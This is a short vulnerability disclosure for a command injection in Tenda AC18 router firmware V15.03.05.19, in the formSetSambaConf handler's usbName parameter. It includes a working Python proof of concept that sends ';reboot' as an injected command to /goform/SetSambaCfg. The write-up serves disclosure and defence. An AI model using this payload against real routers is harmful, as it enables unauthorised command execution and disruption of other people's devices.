# Tenda AC18 V15.03.05.19 Command Injection

## Overview

- Manufacturer's address：https://www.tenda.com.cn/
- Firmware download address ： https://www.tenda.com.cn/download/detail-2683.html

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in formSetSambaConf function.        The contents of the usbName parameters are executed as commands.

![](img/2.png#center)
## POC

Run poc

```python
import requests

url = 'http://10.211.55.20/goform/SetSambaCfg'

headers = {"Cookie": "password=You cookie"}
data = {
    'action': 'del',
    'usbName': ';reboot'
}

r = requests.post(url=url, headers=headers, data=data)
hunzi = r.text
print(hunzi)
```

The router will restart
